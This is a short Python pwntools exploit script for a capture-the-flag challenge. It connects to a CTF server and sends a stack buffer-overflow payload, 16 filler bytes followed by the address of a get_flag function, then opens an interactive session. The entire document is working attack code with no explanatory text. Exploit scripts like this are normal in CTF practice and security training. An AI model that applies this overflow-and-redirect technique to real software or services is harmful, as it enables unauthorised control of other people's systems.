from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28167)
get_flag = 0x804902E
payload  = "I"*16 + p32(get_flag)
io.sendline(payload)
io.interactive()
